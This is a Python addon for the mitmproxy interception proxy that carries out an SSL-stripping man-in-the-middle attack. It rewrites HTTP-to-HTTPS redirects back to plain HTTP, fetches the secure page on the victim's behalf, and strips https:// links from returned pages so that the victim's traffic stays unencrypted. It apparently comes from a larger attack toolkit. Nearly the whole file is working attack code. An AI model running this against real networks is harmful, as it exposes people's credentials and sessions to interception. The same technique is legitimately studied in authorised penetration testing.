
try: 
	import httplib
except ImportError:
	import http.client as httplib

try: 
	from mitmproxy.http import HTTPResponse
except ImportError:
	from mitmproxy.models import HTTPResponse


import requests
import re
import json

import os, imp
common = imp.load_source('common', os.path.abspath(os.path.join('modules', 'bcp_shared.py')))

class SSLStrip:
	def response(self, flow):
		status_code = flow.response.status_code
		if status_code == 301 or status_code == 302:
			url = flow.request.url
			newloc = flow.response.headers["Location"]

			# Check if we have been redirected from http to https
			if url.startswith("http://") and newloc.startswith("https://"):

				# Check if host is a mismatch as well, if host is a mismatch we
				# keep the redirection and just return strip the https part. That way we
				# don't need to keep changing the hosts on requests.
				oldhost = flow.request.headers["Host"]
				newhost = re.search('http[s]?://([a-zA-Z0-9\.]*)/.*', newloc)

				# Redirected to different domain as well, for example
				# http://example.com/ to https://www.example.com/ we then strip
				# the https and return new domain name
				if newhost != None and newhost.group(1) != oldhost:
					flow.response.headers["Location"] = flow.response.headers["Location"].replace("https://", "http://")
					return
				
				# If the domain name is the same we just store it and continue
				url = newloc

			else:
				# Redirection to http:// we just forward
				return

			# Copy the request and send a HTTPS version of it to the server
			resp = requests.request(
				flow.request.method,
				url,
				headers=flow.request.headers,
				data=flow.request.content,
				stream=True,
				allow_redirects=True
			)

			if resp != None:
				flow.response = common.requests2mitmproxy(resp)

		# On 200 responses we need to ensure that we strip https:// links in the document
		elif status_code == 200:
			#flow.response.text = common.stripHttpsLinks(flow.response.text.decode("utf-8"))
			flow.response.text = common.stripHttpsLinks(flow.response.text)
			return

def start():
	return SSLStrip()
